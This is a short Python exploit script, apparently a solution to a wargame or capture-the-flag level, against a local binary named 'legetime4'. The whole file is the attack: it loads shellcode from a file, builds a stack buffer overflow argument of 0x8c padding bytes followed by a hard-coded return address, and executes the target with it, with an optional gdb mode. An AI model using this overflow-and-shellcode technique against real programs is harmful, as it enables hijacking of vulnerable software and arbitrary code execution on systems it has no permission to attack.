#!/usr/bin/env python

TARGET = "legetime4"

#~~~~~~~~~
import sys, os, struct
DEBUG  = 'DEBUG' in sys.argv
def p(a):
  return struct.pack('I', a)
def run(args):
    if DEBUG:
      os.execvp("gdb", ["gdb", "--args", TARGET] + args)
    else:
      os.execv(TARGET, [TARGET] + args)
#~~~~~~~~~

with open('e-penis') as f:
  shellcode = f.read()

hostname = p(0x0804a040)
overflow = 'A'*0x8c + hostname
args = [shellcode, overflow]

run(args)
